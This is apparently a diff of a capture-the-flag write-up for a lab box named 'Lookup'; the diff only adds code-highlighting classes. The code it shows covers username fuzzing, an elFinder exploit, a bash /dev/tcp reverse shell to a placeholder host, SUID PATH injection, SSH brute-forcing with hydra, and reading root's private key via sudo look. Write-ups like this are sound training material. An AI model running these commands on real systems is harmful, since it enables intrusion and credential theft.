@@ -97,7 +97,7 @@ PORT   STATE SERVICE VERSION
 </code></pre>
 <p>HTTP redirects to <code>http://lookup.thm/</code>, so I added the host entry and browsed the site.</p>
 <p>Example hosts entry:</p>
-<pre><code>10.10.11.xx lookup.thm
+<pre><code class="language-text">10.10.11.xx lookup.thm
 </code></pre>
 <h3>Web Application</h3>
 <p>The main site presents a login form. Testing random usernames/passwords shows the application leaks information via its error responses (valid user vs invalid user vs invalid password), which makes it a good target for form fuzzing.</p>
@@ -105,11 +105,11 @@ PORT   STATE SERVICE VERSION
 <h3>Username Enumeration (FFUF)</h3>
 <p>I fuzzed the login form and watched response characteristics (status code / size) to identify valid usernames.</p>
 <p>Example (username fuzz):</p>
-<pre><code>ffuf -u http://lookup.thm/login.php \
+<pre><code class="language-bash">ffuf -u http://lookup.thm/login.php \
   -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
   -X POST \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -d 'username=FUZZ&amp;password=invalid' \
+  -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \
+  -d &#39;username=FUZZ&amp;password=invalid&#39; \
   -fc 200
 </code></pre>
 <p>One username stood out as behaving differently (different response length / different failure message). In this case, <code>admin</code> was a valid username.</p>
@@ -124,7 +124,7 @@ PORT   STATE SERVICE VERSION
 <li><code>files.lookup.thm</code></li>
 </ul>
 <p>So I added it to my hosts file as well:</p>
-<pre><code>10.10.11.xx files.lookup.thm
+<pre><code class="language-text">10.10.11.xx files.lookup.thm
 </code></pre>
 <p>Browsing <code>files.lookup.thm</code> exposes an elFinder instance.</p>
 <h3>elFinder RCE (CVE-2019-9194)</h3>
@@ -138,7 +138,7 @@ PORT   STATE SERVICE VERSION
 </ol>
 <p>Once code execution is working, I switched to a reverse shell.</p>
 <p>Example reverse shell payload:</p>
-<pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/&lt;YOUR_PORT&gt; 0&gt;&amp;1'
+<pre><code class="language-text">bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/&lt;YOUR_PORT&gt; 0&gt;&amp;1&#39;
 </code></pre>
 <h3>Horizontal Privilege Escalation (SUID <code>pwm</code> + PATH Injection)</h3>
 <p>From the <code>www-data</code> shell, I found a SUID binary:</p>
@@ -148,25 +148,25 @@ PORT   STATE SERVICE VERSION
 <p>It invokes common utilities (like <code>id</code>) and attempts to read a <code>.passwords</code> file but looks in the wrong place. By placing a fake <code>id</code> earlier in <code>PATH</code>, I could influence what <code>pwm</code> sees and coax it into revealing the password list.</p>
 <p>In practice, the trick is that <code>pwm</code> appears to call <code>id</code> without an absolute path and then makes decisions based on its output. By writing our own <code>id</code> script into <code>/tmp</code> and prepending <code>/tmp</code> to <code>PATH</code>, <code>pwm</code> will execute our script, which prints an <code>id</code>-style line containing <code>(think)</code>.</p>
 <p>Highlights: SUID bit file pwn</p>
-<pre><code>echo '#!/bin/bash' &gt; /tmp/id
-echo 'echo &quot;uid=33(think) gid=33(think) groups=(think)&quot;' &gt;&gt; /tmp/id
+<pre><code class="language-text">echo &#39;#!/bin/bash&#39; &gt; /tmp/id
+echo &#39;echo &quot;uid=33(think) gid=33(think) groups=(think)&quot;&#39; &gt;&gt; /tmp/id
 chmod +x /tmp/id
 export PATH=/tmp:$PATH
 /usr/sbin/pwm
 </code></pre>
 <p>After that, I collected the leaked passwords into a wordlist and brute-forced SSH for the <code>think</code> user.</p>
 <p>Example:</p>
-<pre><code>hydra -l think -P passwords.txt ssh://lookup.thm
+<pre><code class="language-bash">hydra -l think -P passwords.txt ssh://lookup.thm
 </code></pre>
 <h3>Root (Sudo <code>look</code> via GTFOBins)</h3>
 <p>As <code>think</code>, <code>sudo -l</code> shows a passwordless rule allowing <code>look</code> as root.</p>
 <p>Because <code>look</code> can read arbitrary files (GTFOBins), I used it to dump root-only files.</p>
 <p>Highlights: Sudo <code>look</code> to extract SSH private key</p>
-<pre><code>LFILE=/root/.ssh/id_rsa
-sudo /usr/bin/look '' &quot;$LFILE&quot;
+<pre><code class="language-bash">LFILE=/root/.ssh/id_rsa
+sudo /usr/bin/look &#39;&#39; &quot;$LFILE&quot;
 </code></pre>
 <p>Copy the key locally, lock permissions, and SSH in:</p>
-<pre><code>chmod 600 id_rsa
+<pre><code class="language-bash">chmod 600 id_rsa
 ssh -i id_rsa root@lookup.thm
 </code></pre>
 <h2>Flags</h2>
